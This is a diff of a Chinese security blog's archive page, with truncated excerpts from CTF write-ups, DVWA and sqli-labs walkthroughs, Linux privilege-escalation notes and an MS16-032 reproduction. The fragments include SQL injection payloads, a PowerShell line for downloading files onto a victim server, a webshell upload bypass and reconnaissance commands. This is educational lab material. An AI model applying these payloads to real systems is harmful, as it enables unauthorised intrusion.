@@ -72,7 +72,8 @@
 information_schemainnodb_tables_stats
 大小写对于大小写敏感的 WAF ，可以用大小写绕过
 全大写、大小写混写
-12345678910mysql&gt; select 1,2,3 union select * from users;+----+-------...
+mysql&gt; select 1,2,3 union select * from users;
++----+----------+------...
                                         </p>
                                     </div>
                                 </li>
@@ -121,7 +122,9 @@ bypass
                                             PHP2进入题目后只有一句话： Can you anthenticate to this website?  ，没有其他东西，扫描目录页无果。尝试在index.phps，得到源码
 
 但是显然代码并不完整，右键查看源代码，得到如下
-123456789101112131415&lt;?phpif("admin"===$_GET[id]) &#123;  echo("&lt;p&gt;not al...
+&lt;?php
+if(&quot;admin&quot;===$_GET[id]) {
+  echo(&quot;&lt;p&gt;not allowed!&lt...
                                         </p>
                                     </div>
                                 </li>
@@ -157,9 +160,9 @@ bypass
 JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有碰见过
 本次的漏洞影响的版本范围：3.0.0 至 3.4.6 版本
 环境下载地址
-1https://downloads.joomla.org/it/cms/joomla3/3-4-6
+https://downloads.joomla.org/it/cms/joomla3/3-4-6
 安装完之后访问，会跳转到安装界面，按照步骤安装就可以了
-漏...
+漏洞...
                                         </p>
                                     </div>
                                 </li>
@@ -177,7 +180,32 @@ JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有�
 攻击机：Kali（IP：192.168.199.133）
 靶机：LazySysAdmin（IP：192.168.199.136）
 渗透测试Netdiscover扫描网段，发现靶机IP地址
-1234567891011netdiscover -r 192.168.199.0/24Currently scanni...
+netdiscover -r 192.168.199.0/24
+
+Currently scanning: Finishe...
+                                        </p>
+                                    </div>
+                                </li>
+                            
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">October 04, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/Linux 提权常用命令集/">Linux 提权常用命令集</a>
+                                        <p>
+                                            本文转载自原文：Linux 提权常用命令集
+0x00 操作系统相关操作系统类型版本
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian 
+cat /etc/redhat-release   # Redhat
+内核版本，是否是64位
+getconf LONG_BIT
+cat /proc/version
+una...
                                         </p>
                                     </div>
                                 </li>
@@ -207,13 +235,15 @@ JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有�
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/Linux 提权常用命令集/">Linux 提权常用命令集</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/MS16-032（CVE-2016-0099）复现/">MS16-032（CVE-2016-0099）复现</a>
                                         <p>
-                                            本文转载自原文：Linux 提权常用命令集
-0x00 操作系统相关操作系统类型版本
-1234cat /etc/issuecat /etc/*-releasecat /etc/lsb-release      # Debian cat /etc/redhat-release   # Redhat
-内核版本，是否是64位
-1234567getconf LONG_BITcat /proc/vers...
+                                            漏洞漏洞类型：特权提升
+Microsoft 安全公告：https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032
+exploit-db的详情：https://www.exploit-db.com/exploits/39574/
+利用时需要满足的要求
+
+①系统需要拥有至少2个的CPU核心
+②...
                                         </p>
                                     </div>
                                 </li>
@@ -230,27 +260,8 @@ JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有�
                                             本文转载自原文：13种方式下载文件
 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
 0x01 Powershell创建如下PSH脚本：
-12345$p = New-Object System.Net.WebClient$p.DownloadFile("http://domain/file","C:%homepath%file")如：$p....
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">October 04, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/MS16-032（CVE-2016-0099）复现/">MS16-032（CVE-2016-0099）复现</a>
-                                        <p>
-                                            漏洞漏洞类型：特权提升
-Microsoft 安全公告：https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032
-exploit-db的详情：https://www.exploit-db.com/exploits/39574/
-利用时需要满足的要求
-
-①系统需要拥有至少2个的CPU核心
-②...
+$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
                                         </p>
                                     </div>
                                 </li>
@@ -318,7 +329,7 @@ WordPress框架当中的Activity monitor插件引起的漏洞
 先将webshell的后缀改为png（或者白名单中任意后缀），然后上传，Burpsuit将数据包进行修改，重新将文件后缀改为.php，绕过前端验证就可以
 
 核心代码
-123456789101112...
+function checkF...
                                         </p>
                                     </div>
                                 </li>
@@ -388,13 +399,14 @@ DC-1环境虚拟机平台：VMware Workstation Pro
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">2019XNUCA — ezphp WriteUp</a>
                                         <p>
-                                            Web服务器安装与配置Apache2和php组件的安装使用如下命令来安装Apache2和php的组件
-Ps：如果只安装Apache2，将会导致写的php文件无法被解析
-12apt-get install apache2apt-get install php
-
-命令1234状态：/etc/init.d/apache2 status（service apache2 status）开启：/etc/...
+                                            前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来
+ezphp源代码&lt;?php 
+    $files = scandir(&#39;./&#39;);
+    foreach($files as $file){
+        if($file !== &quot;index.php&quot;){
+            unlink($file...
                                         </p>
                                     </div>
                                 </li>
@@ -406,10 +418,31 @@ Ps：如果只安装Apache2，将会导致写的php文件无法被解析
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">2019XNUCA — ezphp WriteUp</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
                                         <p>
-                                            前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来
-ezphp源代码1234567891011121314151617181920212223242526272829303132&lt;?php 	$files = scandir('./');	foreach($files as $file)&#123;		if($file !== "index.php"...
+                                            Web服务器安装与配置Apache2和php组件的安装使用如下命令来安装Apache2和php的组件
+Ps：如果只安装Apache2，将会导致写的php文件无法被解析
+apt-get install apache2
+apt-get install php
+
+命令状态：/etc/init.d/apache2 status（service apache2 status）
+开启：/etc/init...
+                                        </p>
+                                    </div>
+                                </li>
+                            
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">September 01, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
+                                        <p>
+                                            前言转载文章：https://www.leavesongs.com/PENETRATION/php-filter-magic.html
+php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。
+XXE中的使...
                                         </p>
                                     </div>
                                 </li>
@@ -427,29 +460,13 @@ ezphp源代码1234567891011121314151617181920212223242526272829303132&lt;?php 	$
 写了4个进程调度算法，并利用Python3的PyQt5库设计了GUI，代码量大概为1000行
 第一次接触GUI，现学现卖，没有做任何优化
 一、Python 3.7环境下安装PyQt52.安装PyQt5
-1pip install PyQt5
+pip install PyQt5
 
 2.安装 sip
-1pip  install sip
+pip  install sip
 
 3.安装PyQt5-tools
-1pip ...
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">September 01, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
-                                        <p>
-                                            前言转载文章：https://www.leavesongs.com/PENETRATION/php-filter-magic.html
-php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。
-XXE中的使...
+pip ins...
                                         </p>
                                     </div>
                                 </li>
@@ -477,7 +494,10 @@ Web1. Game题目进去是一个游戏机，只有Shuffle和Stop两个按钮可�
 查看源码，其他没什么用，但是发现一个js文件（cqg.js），点击查看源代码
 
 在末尾发现了关键代码
-12345678910if(score == 15)&#123;    $.ajax(&#123;        url: 'score.php', ...
+if(score == 15){
+    $.ajax({
+        url: &#39;score.php&#39;,
+        typ...
                                         </p>
                                     </div>
                                 </li>
@@ -500,7 +520,16 @@ Web1. Game题目进去是一个游戏机，只有Shuffle和Stop两个按钮可�
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/">2019 ISCC — 线下赛WriteUp</a>
                                         <p>
                                             前言本次比赛的赛程安排是上午解题，下午AWD。算是真正意义上第一次参加AWD比赛，记录一下学习的内容
-PWN123456789101112131415161718192021222324252627282930313233343536373839import stringdic = string.printableflag = ''pair = [    0x17F5B345,0x17F5B...
+PWNimport string
+
+dic = string.printable
+
+flag = &#39;&#39;
+
+pair = [
+    0x17F5B345,0x17F5B30C,
+    0xF16B77E2,0xF16B77B1,
+    0xB2B21947,2998016...
                                         </p>
                                     </div>
                                 </li>
@@ -527,7 +556,10 @@ PWN123456789101112131415161718192021222324252627282930313233343536373839import s
 将一整串二进制转换为十六进制，发现开头是rar文件的开头
 
 直接保存成一个rar文件
-123456789import binasciis = "010100100110000101110010001000010001101000000111...这里就不全写出来，自行补充即可"s = hex(...
+import binascii
+s = &quot;010100100110000101110010001000010001101000000111...这里就不全写出来，自行补充即可&quot;
+
+s = ...
                                         </p>
                                     </div>
                                 </li>
@@ -597,7 +629,9 @@ flag{oho_oho_oho}
                                             前一部分链接：第21-30关Write-up
 第三十一关（md5 collision(NUPT_CTF)）我打开题目是没有给任何提示的，只有链接进去提示&quot;please input a&quot;，源代码也没有写任何东西
 去找别人的WriteUp，别人做题可以看到提示代码：
-123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_G...
+&lt;?php
+$md51 = md5(&#39;QNKCDZO&#39;);
+$a = @$_GET[&#...
                                         </p>
                                     </div>
                                 </li>
@@ -610,6 +644,52 @@ flag{oho_oho_oho}
                                         <h2 class="timeline-title">March 2019</h2>
                                     </div>
                                 </li>
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">March 30, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
+                                        <p>
+                                            常见的文件头JPEG (jpg)，文件头：FF D8 FF E0
+
+PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82
+
+7z：37 7A BC AF 27 1C
+
+GIF (gif)：47 49 46 38 39 61
+
+ZIP Archive (zip)：50 4B 03 04
+
+RAR Archive (r...
+                                        </p>
+                                    </div>
+                                </li>
+                            
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">March 30, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/">2019“嘉韦思杯”上海高校网络安全邀请赛 — 初赛WriteUp</a>
+                                        <p>
+                                            安恒WriteUp安恒2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp
+官方WriteUp官方2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp
+
+第一题（土肥原贤二）SQL注入，gid通过单引号包裹，比较简单就呈现出来
+
+联合注入测试成功
+
+爆数据库、表、列、flag值
+-1&#39; union select 1,2,3,table_name from inform...
+                                        </p>
+                                    </div>
+                                </li>
+                            
                                 
                                 <li class="timeline-item">
                                     <div class="timeline-info">
@@ -642,42 +722,6 @@ flag直接解出来
 
 
 第四关（这不是摩斯密码）...
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">March 30, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/">2019“嘉韦思杯”上海高校网络安全邀请赛 — 初赛WriteUp</a>
-                                        <p>
-                                            安恒WriteUp安恒2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp
-官方WriteUp官方2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp
-
-第一题（土肥原贤二）SQL注入，gid通过单引号包裹，比较简单就呈现出来
-
-联合注入测试成功
-
-爆数据库、表、列、flag值
-123-1&apos; union select 1,2,3,table_name from in...
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">March 30, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
-                                        <p>
-                                            常见的文件头1234567891011121314151617181920212223JPEG (jpg)，文件头：FF D8 FF E0PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 827z：37 7A BC AF 27 1CGIF (gif)：47 49 46 38 39 61ZIP Archive (zip...
                                         </p>
                                     </div>
                                 </li>
@@ -721,7 +765,8 @@ flag直接解出来
 此时，页面多刷新几次，机会看到提示：value变量
 
 -写代码：
-12345678910111213import...
+import requests
+import ...
                                         </p>
                                     </div>
                                 </li>
@@ -736,16 +781,16 @@ flag直接解出来
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/15/Kali学习笔记/">Kali学习笔记</a>
                                         <p>
                                             1. 常用命令grep：就前面执行后显示的内容进行筛选（egrep相反）
-1命令 | grep ["XXX"]
-awk：筛选第X行的内容
-1命令 | awk ["X"]
-cut：裁剪内容，-d 表示分割的标志，-f 接第几部分
-1命令 | cut -d ["X"] -f [X]
+命令 | grep [&quot;XXX&quot;]
 
-ls：列出当前目录下内容（Window下是：dir）
-1ls [-l/-a/-h...]
-cd：切换位置
-12c...
+awk：筛选第X行的内容
+命令 | awk [&quot;X&quot;]
+
+cut：裁剪内容，-d 表示分割的标志，-f 接第几部分
+命令 | cut -d [&quot;X&quot;] -f [X]
+
+
+ls：列出当前目录下内容（Window下是：dir）...
                                         </p>
                                     </div>
                                 </li>
@@ -759,9 +804,13 @@ cd：切换位置
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/14/MySQL5数据库配置与管理/">Mysql数据库</a>
                                         <p>
-                                            （一）数据库安全【Tip】12345Grant：授予Privilege： 特权Revoke：废除Anonymous：匿名的Recurse：递归
+                                            （一）数据库安全【Tip】Grant：授予
+Privilege： 特权
+Revoke：废除
+Anonymous：匿名的
+Recurse：递归
 【原理】​    （1）数据库系统分为内部安全性和外部安全性。
-​    （2）内部安全性关心的是文件系统级的问题，既防止Mysql数据目录（DATADIR）被在服务器主机有账号的人（合法或盗取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人...
+​    （2）内部安全性关心的是文件系统级的问题，既防止Mysql数据目录（DATADIR）被在服务器主机有账号的人（合法或盗取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人均...
                                         </p>
                                     </div>
                                 </li>
@@ -800,9 +849,15 @@ cd：切换位置
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/12/SQL注入详解/">SQL注入详解</a>
                                         <p>
                                             （一）基础知识点union查询（1）系统函数
-12345version()：mysql版本user()：数据库用户名database()：当前数据库名@@datadir：数据库路径@@version_compile_os：当前操作系统
+version()：mysql版本
+user()：数据库用户名
+database()：当前数据库名
+@@datadir：数据库路径
+@@version_compile_os：当前操作系统
 （2）Mysql默认设置
-123information_schema.schemate：默认数据库information_schema.tables：默认数据...
+information_schema.schemate：默认数据库
+information_schema.tables：默认数据表
+i...
                                         </p>
                                     </div>
                                 </li>
@@ -857,12 +912,12 @@ cd：切换位置
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/07/BugKuCTF—杂项题 第21-30关/">BugKuCTF — 杂项题(第21-30关)</a>
                                         <p>
                                             前一部分链接：第11-20关Write-up第二一关（细心的大象）题目链接：
-1https://share.weiyun.com/9287be0a629971ac53d97f39727eee18
+https://share.weiyun.com/9287be0a629971ac53d97f39727eee18
 下载下来一个名为1.jpg.zip的文件，解压下来一张叫做1.jpg的图片，看一下图片属性，看到了好像有用的一串文字
 
 看起来有点像base64的加密，先解开后放着MSDS456ASD123zz
 
-...
+放...
                                         </p>
                                     </div>
                                 </li>
@@ -889,9 +944,9 @@ cd：切换位置
 第三关（Web基础$_GET）进入链接后直接看到信息
 
 根据信息直接输入url得到flag
-1?what=flag
+?what=flag
 
-第四关（...
+第四关（W...
                                         </p>
                                     </div>
                                 </li>
@@ -906,13 +961,13 @@ cd：切换位置
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/04/BugKuCTF—杂项题 第11-20关/">BugKuCTF — 杂项题(第11-20关)</a>
                                         <p>
                                             前一部分链接：第1-10关Write-up第十一关（多种方法解决）题目链接：
-1http://123.206.87.240:8002/misc/3.zip
+http://123.206.87.240:8002/misc/3.zip
 下载下来一个zip文件，解压开是一个KEY.exe文件
 
 用UE打开看一下，开头就发现是imgbase64（图片转换成base64进行存储）
 
 然后百度找在线的base64转换图片网站，得出一个二维码，扫描得到flag
-转换网站可以用一下...
+转换网站可以用一下这...
                                         </p>
                                     </div>
                                 </li>
@@ -937,7 +992,7 @@ cd：切换位置
                                             第一关（签到题）关注公众号扫描二维码就能获得flag
 
 第二关（这是一张单纯的图片）题目链接：
-1http://123.206.87.240:8002/misc/1.jpg
+http://123.206.87.240:8002/misc/1.jpg
 打开链接发现是一张jpg图片
 
 
@@ -945,7 +1000,7 @@ cd：切换位置
 
 使用UE（UltraEdit）打开图片看看。发现在最后几行有着Unicode编码
 
-复制这个Unicode编码，通过在线工具转换成ASCII编码后，F...
+复制这个Unicode编码，通过在线工具转换成ASCII编码后，Fl...
                                         </p>
                                     </div>
                                 </li>
@@ -962,7 +1017,7 @@ cd：切换位置
                                             在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件
 而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：Binwalk、dd、foremost，于是便去了解
 例题：可以借用BUGKU中的这道题，题目地址：
-1https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49...
+https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-...
                                         </p>
                                     </div>
                                 </li>
@@ -976,11 +1031,11 @@ cd：切换位置
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/20/DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）/">DVWA 11-Stored Based Cross Site Scripting (XSS)（Stored型跨站脚本）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\xss_s\source\
+                                            源码位置DVWA\vulnerabilities\xss_s\source\
 页面功能模拟评论模块，输入Name和Message并提交后，会存储在后台并返回给用户
 
 1.XSS存储型攻击简单定义
-XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛、OA、CRM等社交网站上，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞...
+XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这种攻击具有较强的稳定性和持久性，比较常见场景是在博客，论坛、OA、CRM等社交网站上，比如：某CRM系统的客户投诉功能上存在XSS存储型漏洞，...
                                         </p>
                                     </div>
                                 </li>
@@ -994,12 +1049,12 @@ XSS存储型攻击，恶意代码被保存到目标网站的服务器中，这�
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/19/DVWA 10-Reflected Based Cross Site Scripting（XSS）（Reflected型跨站脚本）/">DVWA 10-Reflected Based Cross Site Scripting（XSS）（Reflected型跨站脚本）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\xss_r\source\
+                                            源码位置DVWA\vulnerabilities\xss_r\source\
 页面功能提供一个输入框，输入后返回
 
 XSS攻击需要具备两个条件：需要向web页面注入恶意代码；这些恶意代码能够被浏览器成功的执行
 XSS反射型漏洞
-反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的...
+反射型XSS，顾名思义在于“反射”这个一来一回的过程。反射型XSS的触发有后端的参与，而之所以触发XSS是因为后端解析用户在前端输入的带有XSS性质的脚本或者脚本的d...
                                         </p>
                                     </div>
                                 </li>
@@ -1013,12 +1068,12 @@ XSS反射型漏洞
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/18/DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）/">DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\xss_d\source\
+                                            源码位置DVWA\vulnerabilities\xss_d\source\
 页面功能通过下拉菜单选择一种语言，但是好像没作用
 
 DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式
 1.document 和 windows 对象
-document表示的是一个文档对象，window表示的是一个窗口对...
+document表示的是一个文档对象，window表示的是一个窗口对象...
                                         </p>
                                     </div>
                                 </li>
@@ -1032,11 +1087,11 @@ document表示的是一个文档对象，window表示的是一个窗口对...
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/17/DVWA 8-Weak Session IDs（弱Session ID）/">DVWA 8-Weak Session IDs（弱Session ID）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\weak_id\source\
+                                            源码位置DVWA\vulnerabilities\weak_id\source\
 页面功能点击Generate，向服务器提交当前的dvwaSession值
 
 密码与证书等认证手段，一般仅仅用于登录(Login)的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时,都再使用密码认证一次。因此，当认证完成后，就需要替换一个对用户透明的凭证。这个凭证就是SessionID。
-当用...
+当用户...
                                         </p>
                                     </div>
                                 </li>
@@ -1050,11 +1105,17 @@ document表示的是一个文档对象，window表示的是一个窗口对...
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/16/DVWA 7-SQL Injection（SQL注入）/">DVWA 7-SQL Injection（SQL注入）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\sqli\source\
+                                            源码位置DVWA\vulnerabilities\sqli\source\
 页面功能输入一个ID，返回该ID的信息
 
 Security Level — Low核心代码
-123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123;	// Get input	$id = $_...
+&lt;?php
+
+if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) {
+    // Get input
+    $id = $_REQUEST[ &#39;id&#39; ];
+
+ ...
                                         </p>
                                     </div>
                                 </li>
@@ -1068,12 +1129,12 @@ Security Level — Low核心代码
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/15/DVWA 6-Insecure CAPTCHA（不安全的验证码）/">DVWA 6-Insecure CAPTCHA（不安全的验证码）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\captcha\source\
+                                            源码位置DVWA\vulnerabilities\captcha\source\
 页面功能和CSRF一样的功能：更改密码，但是却要通过验证码（但是由于验证码是由谷歌提供，没有翻墙也就没有验证码）
 
 解决 reCAPTCHA API key missing 问题参考文章：https://blog.csdn.net/RBPicsdn/article/details/80059132
 
-Secu...
+Secur...
                                         </p>
                                     </div>
                                 </li>
@@ -1087,11 +1148,15 @@ Secu...
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/14/DVWA 5-File Upload（文件上传）/">DVWA 5-File Upload（文件上传）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\upload\source\
+                                            源码位置DVWA\vulnerabilities\upload\source\
 页面功能上传本地文件到服务器
 
 Security Level — Low核心代码
-12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123;	// Where are we going to be writing t...
+&lt;?php
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  ...
                                         </p>
                                     </div>
                                 </li>
@@ -1105,12 +1170,12 @@ Security Level — Low核心代码
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/13/DVWA 4-File Inclusion（文件包含）/">DVWA 4-File Inclusion（文件包含）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\fi\source\
+                                            源码位置DVWA\vulnerabilities\fi\source\
 页面功能直接点击file1.php、file2.php、file3.php可以相应跳转到不同的界面
 
 开启allow_url_include进入之后如果allow_url_include没有开启，会出现如下画面
 
-此时只需要进入phpinfo，查看配置文件的路径，比如我的：C:\phpstudy\php\php-5.4...
+此时只需要进入phpinfo，查看配置文件的路径，比如我的：C:\phpstudy\php\php-5.4....
                                         </p>
                                     </div>
                                 </li>
@@ -1124,11 +1189,15 @@ Security Level — Low核心代码
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/12/DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）/">DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\csrf\source\
+                                            源码位置DVWA\vulnerabilities\csrf\source\
 页面功能更改当前用户的密码
 
 Security Level — Low核心代码
-1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ 'Change' ] ) ) &#123;	// Get input	$pass_ne...
+&lt;?php
+
+if( isset( $_GET[ &#39;Change&#39; ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ &#39;password_new&#39; ];...
                                         </p>
                                     </div>
                                 </li>
@@ -1142,11 +1211,15 @@ Security Level — Low核心代码
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/11/DVWA 2-Command Injection（命令注入）/">DVWA 2-Command Injection（命令注入）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\exec\source\
+                                            源码位置DVWA\vulnerabilities\exec\source\
 页面功能可以在我们输入一个IP地址之后，帮我们Ping这个地址并返回结果
 
 Security Level — Low核心代码
-123456789101112131415161718192021&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) &#123;	// Get input...
+&lt;?php
+
+if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
+    // Get input
+    $target = $_REQUEST[...
                                         </p>
                                     </div>
                                 </li>
@@ -1160,11 +1233,17 @@ Security Level — Low核心代码
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/02/10/DVWA 1-Brute Force（暴力破解）/">DVWA 1-Brute Force（暴力破解）</a>
                                         <p>
-                                            源码位置1DVWA\vulnerabilities\brute\source
+                                            源码位置DVWA\vulnerabilities\brute\source
 页面功能输入用户名密码登录
 
 Security Level — Low核心代码
-1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123;	// Get username	...
+&lt;?php
+
+if( isset( $_GET[ &#39;Login&#39; ] ) ) {
+    // Get username
+    $user = $_GET[ &#39;username&#39; ];
+
+    /...
                                         </p>
                                     </div>
                                 </li>
@@ -1180,10 +1259,10 @@ Security Level — Low核心代码
                                         <p>
                                             前一部分链接：第41-50关Write-up
 Less-51与前一关相同，单引号包裹，payload
-1?sort=1&apos;;create table less51 like users--+
+?sort=1&#39;;create table less51 like users--+
 Less-52与Less-50相同，只不过没有报错信息回显，payload
-1?sort=1;create table less51 like users--+
-Less-53与Less-51相...
+?sort=1;create table less51 like users--+
+Less-53与Less-51相同，只...
                                         </p>
                                     </div>
                                 </li>
@@ -1199,8 +1278,8 @@ Less-53与Less-51相...
                                         <p>
                                             前一部分链接：第31-40关Write-up
 Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload
